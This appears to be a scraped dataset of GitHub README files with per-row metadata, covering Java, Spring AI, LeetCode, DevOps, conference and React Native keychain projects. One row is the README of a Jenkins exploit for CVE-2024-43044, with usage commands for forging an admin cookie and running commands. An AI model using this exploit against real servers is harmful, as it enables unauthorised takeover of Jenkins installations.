    <a href=""https://www.instagram.com/yashksaini.codes/""> <img src=""https://img.shields.io/badge/Instagram-%23FF006E.svg?style=for-the-badge&logo=Instagram&logoColor=white""> </a>
    <a href=""https://twitter.com/EasycodesDev""> <img src=""https://img.shields.io/badge/X-%23000000.svg?style=for-the-badge&logo=X&logoColor=white""> </a>
</div>
<br>

<div align='left'>
    <img src=""https://github.com/yashksaini-coder/August-Leetcode-Daily-2024/actions/workflows/detect-changes.yml/badge.svg"">
    <img src=""https://github.com/yashksaini-coder/August-Leetcode-Daily-2024/actions/workflows/pages/pages-build-deployment/badge.svg"">
    <img src=""https://github.com/yashksaini-coder/August-Leetcode-Daily-2024/actions/workflows/jekyll-gh-pages.yml/badge.svg"">
    <img src=""https://github.com/yashksaini-coder/August-Leetcode-Daily-2024/actions/workflows/readme.yml/badge.svg"">
</div>
    
## Solutions

<!-- SOLUTIONS TABLE BEGIN -->
| Leetcode Problem | Problem Statement | Solution |
|---:|:-----|:----:|
| [40](https://leetcode.com/problems/combination-sum-ii/) | Combination Sum II | [Solution](./40-combination-sum-ii/combination-sum-ii.java) |
| [145](https://leetcode.com/problems/binary-tree-postorder-traversal/) | Binary Tree Postorder Traversal | [Solution](./145-binary-tree-postorder-traversal/binary-tree-postorder-traversal.java) |
| [264](https://leetcode.com/problems/ugly-number-ii/) | Ugly Number II | [Solution](./264-ugly-number-ii/ugly-number-ii.java) |
| [273](https://leetcode.com/problems/integer-to-english-words/) | Integer to English Words | [Solution](./273-integer-to-english-words/integer-to-english-words.java) |
| [476](https://leetcode.com/problems/number-complement/) | Number Complement | [Solution](./476-number-complement/number-complement.java) |
| [564](https://leetcode.com/problems/find-the-closest-palindrome/) | Find the Closest Palindrome | [Solution](./564-find-the-closest-palindrome/find-the-closest-palindrome.java) |
| [592](https://leetcode.com/problems/fraction-addition-and-subtraction/) | Fraction Addition and Subtraction | [Solution](./592-fraction-addition-and-subtraction/fraction-addition-and-subtraction.java) |
| [624](https://leetcode.com/problems/maximum-distance-in-arrays/) | Maximum Distance in Arrays | [Solution](./624-maximum-distance-in-arrays/maximum-distance-in-arrays.java) |
| [650](https://leetcode.com/problems/2-keys-keyboard/) | 2 Keys Keyboard | [Solution](./650-2-keys-keyboard/2-keys-keyboard.java) |
| [664](https://leetcode.com/problems/strange-printer/) | Strange Printer | [Solution](./664-strange-printer/strange-printer.java) |
| [719](https://leetcode.com/problems/find-k-th-smallest-pair-distance/) | Find K Th Smallest Pair Distance | [Solution](./719-find-k-th-smallest-pair-distance/find-k-th-smallest-pair-distance.java) |
| [776](https://leetcode.com/problems/n-ary-tree-postorder-traversal/) | N Ary Tree Postorder Traversal | [Solution](./776-n-ary-tree-postorder-traversal/n-ary-tree-postorder-traversal.java) |
| [789](https://leetcode.com/problems/kth-largest-element-in-a-stream/) | Kth Largest Element in a Stream | [Solution](./789-kth-largest-element-in-a-stream/kth-largest-element-in-a-stream.java) |
| [870](https://leetcode.com/problems/magic-squares-in-grid/) | Magic Squares in Grid | [Solution](./870-magic-squares-in-grid/magic-squares-in-grid.java) |
| [890](https://leetcode.com/problems/lemonade-change/) | Lemonade Change | [Solution](./890-lemonade-change/lemonade-change.java) |
| [921](https://leetcode.com/problems/spiral-matrix-iii/) | Spiral Matrix III | [Solution](./921-spiral-matrix-iii/spiral-matrix-iii.java) |
| [984](https://leetcode.com/problems/most-stones-removed-with-same-row-or-column/) | Most Stones Removed With same Row or Column | [Solution](./984-most-stones-removed-with-same-row-or-column/most-stones-removed-with-same-row-or-column.java) |
| [999](https://leetcode.com/problems/regions-cut-by-slashes/) | Regions Cut by Slashes | [Solution](./999-regions-cut-by-slashes/regions-cut-by-slashes.java) |
| [1240](https://leetcode.com/problems/stone-game-ii/) | Stone Game II | [Solution](./1240-stone-game-ii/stone-game-ii.java) |
| [1325](https://leetcode.com/problems/path-with-maximum-probability/) | Path With Maximum Probability | [Solution](./1325-path-with-maximum-probability/path-with-maximum-probability.java) |
| [1556](https://leetcode.com/problems/make-two-arrays-equal-by-reversing-subarrays/) | Make Two Arrays Equal by Reversing Subarrays | [Solution](./1556-make-two-arrays-equal-by-reversing-subarrays/make-two-arrays-equal-by-reversing-subarrays.java) |
| [1615](https://leetcode.com/problems/range-sum-of-sorted-subarray-sums/) | Range Sum of Sorted Subarray Sums | [Solution](./1615-range-sum-of-sorted-subarray-sums/range-sum-of-sorted-subarray-sums.java) |
| [1691](https://leetcode.com/problems/minimum-number-of-days-to-disconnect-island/) | Minimum Number of Days to Disconnect Island | [Solution](./1691-minimum-number-of-days-to-disconnect-island/minimum-number-of-days-to-disconnect-island.java) |
| [2035](https://leetcode.com/problems/count-sub-islands/) | Count Sub Islands | [Solution](./2035-count-sub-islands/count-sub-islands.java) |
| [2067](https://leetcode.com/problems/maximum-number-of-points-with-cost/) | Maximum Number of Points With Cost | [Solution](./2067-maximum-number-of-points-with-cost/maximum-number-of-points-with-cost.java) |
| [2163](https://leetcode.com/problems/kth-distinct-string-in-an-array/) | Kth Distinct String in an Array | [Solution](./2163-kth-distinct-string-in-an-array/kth-distinct-string-in-an-array.java) |
| [2255](https://leetcode.com/problems/minimum-swaps-to-group-all-1s-together-ii/) | Minimum Swaps to Group all 1s Together II | [Solution](./2255-minimum-swaps-to-group-all-1s-together-ii/minimum-swaps-to-group-all-1s-together-ii.java) |
| [2727](https://leetcode.com/problems/number-of-senior-citizens/) | Number of Senior Citizens | [Solution](./2727-number-of-senior-citizens/number-of-senior-citizens.java) |
| [2803](https://leetcode.com/problems/modify-graph-edge-weights/) | Modify Graph Edge Weights | [Solution](./2803-modify-graph-edge-weights/modify-graph-edge-weights.java) |
| [3276](https://leetcode.com/problems/minimum-number-of-pushes-to-type-word-ii/) | Minimum Number of Pushes to Type Word II | [Solution](./3276-minimum-number-of-pushes-to-type-word-ii/minimum-number-of-pushes-to-type-word-ii.java) |
| [NaN](https://leetcode.com/problems//) |  | [Solution](./scripts/.java) |
<!-- SOLUTIONS TABLE END -->

<br>
",0,0,3,4.0,['solution'],['solution']
alibaba/spring-ai-alibaba,main,"# [Spring AI Alibaba](https://sca.aliyun.com/ai/)

[中文版本](./README-zh.md)

An AI application framework for Java developers built on top of Spring AI that provides seamless integration with Alibaba Cloud QWen LLM services and cloud-native infrastructures.

## Get Started
Please refer to [quick start](https://sca.aliyun.com/ai/get-started/) for how to quickly add generative AI to your Spring Boot applications.

Overall, it takes only two steps to turn your Spring Boot application into an intelligent agent:

1. Add 'spring-ai-alibaba-starter' dependency to your project.

```xml
<dependency>
	<groupId>com.alibaba.cloud.ai</groupId>
	<artifactId>spring-ai-alibaba-starter</artifactId>
	<version>1.0.0-M2</version>
</dependency>
```

> NOTICE! Since spring-ai related packages haven't been published to the central repo yet, it's needed to add the following maven repository to your project in order to successfully resolve artifacts like  spring-ai-core.
>
> ```xml
> <repositories>
> 	<repository>
> 		<id>spring-milestones</id>
> 		<name>Spring Milestones</name>
> 		<url>https://repo.spring.io/milestone</url>
> 		<snapshots>
> 			<enabled>false</enabled>
> 		</snapshots>
> 	</repository>
> </repositories>
> ```

2. Inject the default `ChatClient` Bean to regular Controller beans.

```java
@RestController
public class ChatController {

	private final ChatClient chatClient;

	public ChatController(ChatClient.Builder builder) {
		this.chatClient = builder.build();
	}

	@GetMapping(""/chat"")
	public String chat(String input) {
		return this.chatClient.prompt()
				.user(input)
				.call()
				.content();
	}
}
```

## Examples
More examples can be found at [spring-ai-alibaba-examples](./spring-ai-alibaba-examples).

* Hello World
* Chat Model
* Function Calling
* Structured Output
* Prompt
* RAG
* Flight Booking Playground, an advanced example showcasing usage of prompt template, function calling, chat memory and rag at the same time.

## Core Features

Spring AI Alibaba provides the following features, read the [documentation](https://sca.aliyun.com/ai) on our website for more details of how to use these features.

* Support for Alibaba Cloud QWen Model and Dashscope Model service.
* Support high-level AI agent abstraction -- ChatClient.
* Support various Model types like Chat, Text to Image, Audio Transcription, Text to Speech.
* Both synchronous and stream API options are supported.
* Mapping of AI Model output to POJOs.
* Portable API across Vector Store providers.
* Function calling.
* Spring Boot Auto Configuration and Starters.
* RAG (Retrieval-Augmented Generation) support: DocumentReader, Splitter, Embedding, VectorStore, and Retriever.
* Support conversation with ChatMemory

## Roadmap

Spring AI Alibaba aims to reduce the complexity of building ai native java applications, from development, evaluation to deployment and observability. In order to achieve that, we provide both open-source framework and ecosystem integrations around it, below are the features that we plan to support in the near future:
* Prompt Template Management
* Event Driven AI Application
* Support of more Vector Databases
* Function Deployment
* Observability
* AI proxy support: prompt filtering, rate limit, multiple Model, etc.
* Development Tools

![ai-native-architecture](./docs/imgs/spring-ai-alibaba-arch.png)

## References
* [Spring AI](https://docs.spring.io/spring-ai/reference/index.html)
* [Alibaba Cloud Dashscope Model Service Platform (阿里云百炼模型服务及应用开发平台)](https://help.aliyun.com/zh/model-studio/getting-started/what-is-model-studio/)

## Contact Us
* Dingtalk Group (钉钉群), search `64485010179` and join.
* Wechat Group (微信公众号), scan the QR code below and follow us.

<img src=""./docs/imgs/wechat-account.jpg"" style=""max-width:100px;""/>

",1,4,1,25.0,"['spring', 'ai', 'alibaba', 'http', 'get', 'start', 'example', 'core', 'feature', 'roadmap', 'reference', 'contact', 'u']","['spring', 'ai', 'alibaba', 'http', 'get']"
Giovds/outdated-maven-plugin,main,"# The Outdated Maven Plugin

> Stay up-to-date and secure with The Outdated Maven Plugin!

The Outdated Maven Plugin is a tool designed to help developers identify outdated dependencies in their Maven projects.
By scanning the dependencies of your project, this plugin determines if they are no longer actively maintained
based on a user-defined threshold of inactivity in years. This ensures that your project remains up-to-date with the
latest and most secure versions of its dependencies.

## Usage

You can use the plugin as standalone for a quick check by simply running the following command in your favourite
project:\
`mvn com.giovds:outdated-maven-plugin:check -Dyears=<number_of_years>`

Or plug it into your build:

```xml

<build>
    <plugins>
        <plugin>
            <groupId>com.giovds</groupId>
            <artifactId>outdated-maven-plugin</artifactId>
            <version>1.2.0</version>
            <configuration>
                <!-- The maximum amount of inactive years allowed -->
                <years>1</years>
                <!-- Whether to fail the build if an outdated dependency is found -->
                <shouldFailBuild>false</shouldFailBuild>
            </configuration>
            <executions>
                <execution>
                    <id>outdated-check</id>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

## Contributing

Contributions are welcome! \
Please verify if a similar issue is not reported already. If it is not create one, if it is.

## License

This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
",1,7,1,14.0,"['the', 'outdated', 'maven', 'plugin', 'usage', 'contribute', 'license']","['the', 'outdated', 'maven', 'plugin', 'usage']"
Lunatix01/ragscan,master,"Simple CLI Retrieval Augmented Generation Scanner
=================================================
Aim of the project: A showcase of a RAG scanner written in Java and using [Spring AI](https://docs.spring.io/spring-ai/reference/api/index.html), which scans the targeted documents and you can ask questions to the LLM regarding the given documents.

## Disclaimer
This tool is intended for educational and productivity purposes only. It is designed to assist users in managing and querying their own documents. Any illegal or unethical use of this software is strictly prohibited.

## Requirements
1. [Java 21](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html) installed on your device
2. [Docker](https://www.docker.com/products/docker-desktop/)
3. An environment variable named `GOOGLE_API_KEY` and add your [Google Gemini API key](https://ai.google.dev/gemini-api/docs/api-key)

## Installation
1. Navigate to the project directory
2. Open CMD/Powershell/Terminal
3. For Windows Run `./mvnw clean install`, for Linux/Mac run `./mvn clean install`

## How to use:
1. Run `docker-compose up` in your CMD/Powershell/Terminal
2. Run the project using maven, on Windows: `./mvnw spring-boot:run`, on Linux/Mac run `./mvn spring-boot:run`.
3. When the shell opens type `collection-size 768` (for Gemini `768` is compatible).
4. Place your files in a directory, copy the full path of the directory, and run something like this `load /your/path`, wait till the files are chunked and loaded to `Qdrant vector database`.
5. Finally in the shell write `ask ""your question here""` and that's it.


### Notes
It's a simple project, needs a lot of improvements like: 
1. Improve chunking documents (Currently chunked by token size)
2. Support more file types (Currently supports txt, HTML, JSON, MD, docx, ppt, pdf, and a lot more)
3. Support other Chat models like GPT, Ollama, etc... (currently supports Gemini version `gemini-1.5-flash-latest`, the reason I decided to use Gemini is because it has a good free tier)
4. Support to make it a standalone executable and a jar file, (Currently you can build it yourself and run it, it has no problem, but I will simplify it)
5. Support other vector databases ( Currently supports Qdrant, to be honest, it's good enough)
6. Support custom System Context and custom similar returned documents in DB (Default, for now, is 5.)

#### Rabbit hole
Don't try to retrieve an API key from older `.git` versions, it's a rabbit hole :)

Please create an Issue, if something is wrong I will look into it, and feel free to contribute to the project.
==============
",0,2,2,2.0,"['disclaimer', 'requirement', 'installation', 'how', 'use', 'note', 'rabbit', 'hole']","['disclaimer', 'requirement', 'installation', 'how', 'use']"
xsreality/abstractness-instability-calculator,main,"# Abstractness and Instability Metrics Calculator

This application calculates abstractness and instability metrics for Java, Spring Boot projects, helping developers analyze the structure and dependencies of their codebase.

It follows the principles of Spring Modulith by analyzing the [application module packages](https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple). These are direct sub-packages of the _main_ package that contains the `@SpringBootApplication` annotated class. Ideally, these packages are expected to be functional layers rather than technical layers (controller, services, repositories etc.).

A [Nix Flake](#nix-flake) is provided to help build on systems with outdated java and maven installations.

![screenshot](https://github.com/user-attachments/assets/a496037d-62b2-42b5-809f-0eec2f63018a)

Dependency Visualization

![dependency_visualization_recording](https://github.com/user-attachments/assets/83ed8bae-5b0d-4b8c-a356-820e29c3ebad)

## Features

- Scans Spring Boot projects to identify packages and their relationships
- Calculates abstractness, instability, and distance from the main sequence for each package
- Provides a web interface for easy project analysis
- Visualizes results using an interactive scatter plot
- Dependency visualization

## Prerequisites

- Java 22 or higher
- Maven 3.6 or higher

## Installation

1. Clone the repository:
   ```
   git clone https://github.com/xsreality/abstractness-instability-calculator.git
   ```

2. Navigate to the project directory:
   ```
   cd abstractness-instability-calculator
   ```

3. Build the project:
   ```
   mvn clean install
   ```

## Usage

1. Run the application:
   ```
   java -jar target/abstractness-instability-calculator-1.0-SNAPSHOT.jar
   ```

2. Open a web browser and go to `http://localhost:8080`

3. Enter the path to your Java project in the input field

4. Click ""Scan"" to analyze the project

5. View the results in the interactive scatter plot

## Nix Flake

1. Enter development environment
   ```
   nix develop
   ```

2. Build application
   ```
   mvn clean package -DskipTests
   ```

3. Run application
   ```
   java -jar target/abstractness-instability-calculator*.jar
   ```

## Understanding the Results

The scatter plot visualizes three key metrics for each package:

### Instability (I)
- **Range**: 0 to 1
- **Interpretation**: 
  - 0: Maximally stable
  - 1: Maximally unstable
- **Calculation**: I = Ce / (Ca + Ce), where:
  - Ce: Efferent Couplings (outgoing dependencies)
  - Ca: Afferent Couplings (incoming dependencies)
- **Practical Use**: 
  - Helps identify packages that are more likely to change due to changes in other packages.
  - Stable packages (low I) are good candidates for being depended upon.
  - Unstable packages (high I) should generally depend on stable packages to maintain system stability.

### Abstractness (A)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Completely concrete
  - 1: Completely abstract
- **Calculation**: A = (Number of abstract classes and interfaces) / (Total number of classes)
- **Practical Use**:
  - Indicates the level of abstraction in a package.
  - Highly abstract packages (high A) are often more flexible but may be less directly usable.
  - Concrete packages (low A) are typically more immediately usable but may be less flexible.

### Distance from the Main Sequence (D)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Directly on the Main Sequence (optimal)
  - 1: Furthest from the Main Sequence (problematic)
- **Calculation**: D = |A + I - 1|
- **Practical Use**:
  - Measures how well a package balances abstractness and stability.
  - Packages close to the Main Sequence (low D) are considered well-designed.
  - Helps identify packages that may need refactoring or restructuring.

### Interpreting the Scatter Plot

The plot visualizes these metrics and highlights two important zones:

1. **Zone of Pain** (Bottom-left corner):
   - High stability (low I) and low abstractness (low A)
   - Packages here are difficult to extend and have many dependents
   - Example: A database schema class that many other classes depend on

2. **Zone of Uselessness** (Top-right corner):
   - Low stability (high I) and high abstractness (high A)
   - Packages here are abstract but have no dependents, indicating potentially unused code
   - Example: An over-engineered set of interfaces with no implementations

3. **Main Sequence** (Diagonal line from top-left to bottom-right):
   - Represents an ideal balance between abstractness and instability
   - Packages should aim to be close to this line

### Color Coding
- **Green**: Packages close to the Main Sequence (D ≤ 0.5)
- **Red**: Packages far from the Main Sequence (D > 0.5)

### Practical Application
- Use these metrics to identify packages that may need refactoring:
  - Packages in the Zone of Pain might benefit from increased abstraction.
  - Packages in the Zone of Uselessness might need to be made more concrete or removed if unused.
  - Red packages (high D) are primary candidates for restructuring.
- Monitor these metrics over time to ensure your codebase maintains a good structure as it evolves.
- Use in conjunction with other software quality metrics and practices for a comprehensive view of your codebase's health.

While these metrics provide valuable insights, they should not be treated as absolute rules. Always consider the specific context and requirements of your project when making architectural decisions.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

",0,0,1,9.0,"['abstractness', 'instability', 'metric', 'calculator', 'feature', 'prerequisite', 'installation', 'usage', 'nix', 'flake', 'understand', 'result', 'instability', 'i', 'abstractness', 'a', 'distance', 'main', 'sequence', 'd', 'interpret', 'scatter', 'plot', 'color', 'cod', 'practical', 'application', 'contribute', 'license']","['abstractness', 'instability', 'metric', 'calculator', 'feature']"
Hindhuja-V/devOps-project,main,"# Real-World DevOps/Cloud Projects For Learning by ProDevOpsGuy♐

![DevOps-Projects](https://imgur.com/5czbYqE.png)

## DevOps Real World Projects for Aspiring DevOps Engineers [Beginner to Advanced]

### Repository Contents for DevOps Projects from Beginner to Advanced Levels

The repository contains hands-on DevOps projects suitable for individuals at various skill levels, ranging from beginner to advanced.

### Integration of DevOps Technology with Other Technologies

Projects in this repository showcase the integration of DevOps practices with other cutting-edge technologies such as Machine Learning, Git, GitHub, etc.

### Project Scope

The projects included cover a wide array of topics within the DevOps domain, providing practical experience and insights into real-world scenarios.

### Why Explore This Repository?

Whether you're new to DevOps or looking to enhance your skills, this repository offers valuable resources and projects to help you learn and grow in the field.

### Contribute and Collaborate

Feel free to contribute your own DevOps projects or collaborate with others in enhancing existing projects. Let's build a thriving community of DevOps enthusiasts!

## Hit the Star! ⭐

**If you are planning to use this repository for learning, please give it a star. Thanks!**

### Author by:

![](https://imgur.com/2j6Aoyl.png)

> [!Note]
> Join Our [Telegram Community](https://t.me/prodevopsguy) || [Follow me](https://github.com/NotHarshhaa) for more DevOps Content
",0,0,1,0.0,"['project', 'for', 'learning', 'devops', 'real', 'world', 'project', 'aspiring', 'devops', 'engineer', 'beginner', 'advanced', 'repository', 'content', 'devops', 'project', 'beginner', 'advanced', 'level', 'integration', 'devops', 'technology', 'other', 'technology', 'project', 'scope', 'why', 'explore', 'this', 'repository', 'contribute', 'collaborate', 'hit', 'star', 'author', 'by']","['project', 'devops', 'beginner', 'advanced', 'repository']"
Softwerkskammer-Linz/SoCraTesAT-2024,main,"# SoCraTes Austria 2024

## Staying in Touch

- [Software Craft Communities Worldwide](https://www.softwarecrafters.org/)
- [Software Crafters Slack](https://slack.softwarecrafters.org/)
- [Software Crafters Slack - Austria Channel](https://softwarecrafters.slack.com/archives/CDESPD831)

## Day One: 20th Sept. 2024

* [TDD Ensemble](tdd-ensemble-david)
* [5 or more ways to find bugs](5-or-more-ways-to-find-bugs)
* [Software Crafting Discussion](software-crafting-discussion)
* [Running LLMs on your hardware with Ollama](running-llms-on-your-hardware-with-ollama)
* [How NOT to modernize your legacy application](how-not-to-modernize-your-legacy-application)
* [Domain Driven Design](domain-driven-design)
* [Prompt Writing Self Help Group](prompt-writing-self-help-group)
* [Backup Made Easy](backup-made-easy)
* [mob.sh Ensemble](mob.sh-ensemble)
* [web testing via webQsee: features is not success](web-testing-via-webqsee-features-is-not-success)
* [Introduction to Systems Thinking](introduction-to-systems-thinking)
* [DDEV Docker + PHP](ddev-docker-php)
* [IntelliJ keyboard shortcuts](intellij-keyboard-shortcuts)

## Day Two: 21st Sept. 2024

* [Best practices for successful GIT collaboration](best-practices-for-successful-git-collaboration)
* [DDD Tactical Design](ddd-tactical-design)
* [how i joined the 1kb club](how-i-joined-the-1kb-club)
* [Lightning Talks](lightning-talks)
* [The Survivor's Guide to OKR](the-survivor_s-guide-to-OKRs)
* [React Compiler](react-compiler)
* [Minimal APIs / Controller -> Router/Handler / Kotlin + Kotest](minimal-apis)
* [Web-Component development. Storybook + Stencil](web-component-driven-development)",0,0,1,26.0,"['socrates', 'austria', 'stay', 'touch', 'day', 'one', 'day', 'two']","['day', 'socrates', 'austria', 'stay', 'touch']"
convisolabs/CVE-2024-43044-jenkins,master,"## Intro
This is an exploit for CVE-2024-43044, an arbitrary file read that allows an agent to fetch files from the controller.

The exploit will use the vulnerability to read files to forge a remember-me cookie for an admin account and gain access to
Jenkins scripting engine.

Check out the full writeup at https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/

## Building the exploit
```
mvn package
```

## Running the exploit

```
Exploit Usages:
    java -jar exploit.jar mode_secret <jenkinsUrl> <nodeName> <nodeSecretKey>
    java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>
    java -jar exploit.jar mode_attach <cmd>
```


## Testing 

You can test it in vulnerable version using docker:

```
docker run -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:2.441-jdk17
```

Once you have a jenkins runnning, setup an agent.

The controller/agent connection can be either default (using url, nodename, secret) or via SSH.

## Demonstration

![RCE](./assets/rce_mode_secret.gif).


## References

https://www.jenkins.io/security/advisory/2024-08-07/
",0,0,3,0.0,"['intro', 'building', 'exploit', 'run', 'exploit', 'test', 'demonstration', 'reference']","['exploit', 'intro', 'building', 'run', 'test']"
osiristape/data-structure-activities,main,"## Data Structure And Algorithm
Schedule: 
---
**Wednesday** - 10:00 AM -> 12:00 PM <br>
**Thursday** - 9:00 AM -> 12:00 PM

Submission Compilation <br>
1. [Activity01](https://github.com/osiristape/Python-Basics/blob/main/Activity01.ipynb) // python
2. [Activity02](https://github.com/osiristape/data-structure-activities/blob/main/Hworld.java) // avg
3. [Activity03](https://github.com/osiristape/data-structure-activities/blob/main/ATM.java) // atm

",0,0,1,0.0,"['data', 'structure', 'and', 'algorithm']","['data', 'structure', 'and', 'algorithm']"
DorianMazur/react-native-keychain-manager,main,"<h1 align=""center"">react-native-keychain-manager</h1>

[![npm](https://img.shields.io/npm/v/react-native-keychain-manager.svg)](https://npmjs.com/package/react-native-keychain-manager)

# Keychain/Keystore Access for React Native

- [Keychain/Keystore Access for React Native](#keychainkeystore-access-for-react-native)
  - [Installation](#installation)
  - [Usage](#usage)
  - [API](#api)
    - [`setGenericPassword(username, password, [{ accessControl, accessible, accessGroup, service, securityLevel }])`](#setgenericpasswordusername-password--accesscontrol-accessible-accessgroup-service-securitylevel-)
    - [`hasGenericPassword([{ service }])`](#hasgenericpassword-service-)
    - [`getGenericPassword([{ authenticationPrompt, service, accessControl }])`](#getgenericpassword-authenticationprompt-service-accesscontrol-)
    - [`resetGenericPassword([{ service }])`](#resetgenericpassword-service-)
    - [`getAllGenericPasswordServices()`](#getallgenericpasswordservices)
    - [`setInternetCredentials(server, username, password, [{ accessControl, accessible, accessGroup, securityLevel }])`](#setinternetcredentialsserver-username-password--accesscontrol-accessible-accessgroup-securitylevel-)
    - [`hasInternetCredentials(server)`](#hasinternetcredentialsserver)
    - [`getInternetCredentials(server, [{ authenticationPrompt }])`](#getinternetcredentialsserver--authenticationprompt-)
    - [`resetInternetCredentials(server)`](#resetinternetcredentialsserver)
    - [`requestSharedWebCredentials()` (iOS and visionOS only)](#requestsharedwebcredentials-ios-and-visionos-only)
    - [`setSharedWebCredentials(server, username, password)` (iOS and visionOS only)](#setsharedwebcredentialsserver-username-password-ios-and-visionos-only)
    - [`canImplyAuthentication([{ authenticationType }])` (iOS and visionOS only)](#canimplyauthentication-authenticationtype--ios-and-visionos-only)
    - [`getSupportedBiometryType()`](#getsupportedbiometrytype)
    - [`getSecurityLevel([{ accessControl }])` (Android only)](#getsecuritylevel-accesscontrol--android-only)
    - [Options](#options)
      - [Data Structure Properties/Fields](#data-structure-propertiesfields)
        - [`authenticationPrompt` Properties](#authenticationprompt-properties)
      - [`Keychain.ACCESS_CONTROL` enum](#keychainaccess_control-enum)
      - [`Keychain.ACCESSIBLE` enum](#keychainaccessible-enum)
      - [`Keychain.AUTHENTICATION_TYPE` enum](#keychainauthentication_type-enum)
      - [`Keychain.BIOMETRY_TYPE` enum](#keychainbiometry_type-enum)
      - [`Keychain.SECURITY_LEVEL` enum (Android only)](#keychainsecurity_level-enum-android-only)
      - [`Keychain.STORAGE_TYPE` enum (Android only)](#keychainstorage_type-enum-android-only)
      - [`Keychain.SECURITY_RULES` enum (Android only)](#keychainsecurity_rules-enum-android-only)
  - [Important Behavior](#important-behavior)
    - [Rule 1: Automatic Security Level](#rule-1-automatic-security-level)
  - [Manual Installation](#manual-installation)
    - [iOS](#ios)
      - [Option: Manually](#option-manually)
      - [Option: With CocoaPods](#option-with-cocoapods)
      - [Enable `Keychain Sharing` entitlement for iOS 10+](#enable-keychain-sharing-entitlement-for-ios-10)
    - [Android](#android)
      - [Option: Manually](#option-manually-1)
      - [Proguard Rules](#proguard-rules)
  - [Unit Testing with Jest](#unit-testing-with-jest)
    - [Using a Jest `__mocks__` Directory](#using-a-jest-__mocks__-directory)
    - [Using a Jest Setup File](#using-a-jest-setup-file)
  - [Notes](#notes)
    - [Android Notes](#android-notes)
      - [Configuring the Android-specific behavior](#configuring-the-android-specific-behavior)
    - [iOS Notes](#ios-notes)
    - [macOS Catalyst](#macos-catalyst)
    - [visionOS](#visionos)
    - [Security](#security)

## Installation

1. Run `yarn add react-native-keychain-manager`

   1 a. **Only for React Native <= 0.59**: `$ react-native link react-native-keychain-manager` and check `MainApplication.java` to verify the package was added. See manual installation below if you have issues with `react-native link`.

2. Run `pod install` in `ios/` directory to install iOS dependencies.
3. If you want to support FaceID, add a `NSFaceIDUsageDescription` entry in your `Info.plist`.
4. Re-build your Android and iOS projects.

## Usage

```js
import * as Keychain from 'react-native-keychain-manager';

async () => {
  const username = 'zuck';
  const password = 'poniesRgr8';

  // Store the credentials
  await Keychain.setGenericPassword(username, password);

  try {
    // Retrieve the credentials
    const credentials = await Keychain.getGenericPassword();
    if (credentials) {
      console.log(
        'Credentials successfully loaded for user ' + credentials.username
      );
    } else {
      console.log('No credentials stored');
    }
  } catch (error) {
    console.log(""Keychain couldn't be accessed!"", error);
  }
  await Keychain.resetGenericPassword();
};
```

See `KeychainExample` for fully working project example.

Both `setGenericPassword` and `setInternetCredentials` are limited to strings only, so if you need to store objects etc, please use `JSON.stringify`/`JSON.parse` when you store/access it.

## API

### `setGenericPassword(username, password, [{ accessControl, accessible, accessGroup, service, securityLevel }])`

Will store the username/password combination in the secure storage. Resolves to `{service, storage}` or rejects in case of an error. `storage` - is a name of used internal cipher for saving secret; `service` - name used for storing secret in internal storage (empty string resolved to valid default name).

### `hasGenericPassword([{ service }])`

Will check if the username/password combination is available for service in the secure storage. Resolves to `true` if an entry exists or `false` if it doesn't.

### `getGenericPassword([{ authenticationPrompt, service, accessControl }])`

Will retrieve the username/password combination from the secure storage. Resolves to `{ username, password, service, storage }` if an entry exists or `false` if it doesn't. It will reject only if an unexpected error is encountered like lacking entitlements or permission.

### `resetGenericPassword([{ service }])`

Will remove the username/password combination from the secure storage. Resolves to `true` in case of success.

### `getAllGenericPasswordServices()`

Will retrieve all known service names for which a generic password has been stored (e.g., `setGenericPassword`).

_Note_: on iOS this will actully read the encrypted entries, so it will trigger an authentication UI if you have encrypted any entries with password/biometry.

### `setInternetCredentials(server, username, password, [{ accessControl, accessible, accessGroup, securityLevel }])`

Will store the server/username/password combination in the secure storage. Resolves to `{ username, password, service, storage }`;

### `hasInternetCredentials(server)`

Will check if the username/password combination for server is available in the secure storage. Resolves to `true` if an entry exists or `false` if it doesn't.

### `getInternetCredentials(server, [{ authenticationPrompt }])`

Will retrieve the server/username/password combination from the secure storage. Resolves to `{ username, password }` if an entry exists or `false` if it doesn't. It will reject only if an unexpected error is encountered like lacking entitlements or permission.

### `resetInternetCredentials(server)`

Will remove the server/username/password combination from the secure storage.

### `requestSharedWebCredentials()` (iOS and visionOS only)

Asks the user for a shared web credential. Requires additional setup both in the app and server side, see [Apple documentation](https://developer.apple.com/documentation/security/shared_web_credentials). Resolves to `{ server, username, password }` if approved and `false` if denied and throws an error if not supported on platform or there's no shared credentials.

### `setSharedWebCredentials(server, username, password)` (iOS and visionOS only)

Sets a shared web credential. Resolves to `true` when successful.

### `canImplyAuthentication([{ authenticationType }])` (iOS and visionOS only)

Inquire if the type of local authentication policy is supported on this device with the device settings the user chose. Should be used in combination with `accessControl` option in the setter functions. Resolves to `true` if supported.

### `getSupportedBiometryType()`

**On iOS and visionOS:** Get what type of hardware biometry support the device can use for biometric encryption. Resolves to a `Keychain.BIOMETRY_TYPE` value when supported and enrolled, otherwise `null`.

**On Android:** Get what type of Class 3 (strong) biometry support the device has. Resolves to a `Keychain.BIOMETRY_TYPE` value when supported, otherwise `null`. In most devices this will return `FINGERPRINT` (except for Pixel 4 or similar where fingerprint sensor is not present).

> This method returns `null`, if the device haven't enrolled into fingerprint/FaceId. Even though it has hardware for it.

### `getSecurityLevel([{ accessControl }])` (Android only)

Get security level that is supported on the current device with the current OS. Resolves to `Keychain.SECURITY_LEVEL` enum value.

### Options

#### Data Structure Properties/Fields

| Key                        | Platform      | Description                                                                                      | Default                                                                   |
| -------------------------- |---------------| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| **`accessControl`**        | All           | This dictates how a keychain item may be used, see possible values in `Keychain.ACCESS_CONTROL`. | _None_                                                                    |
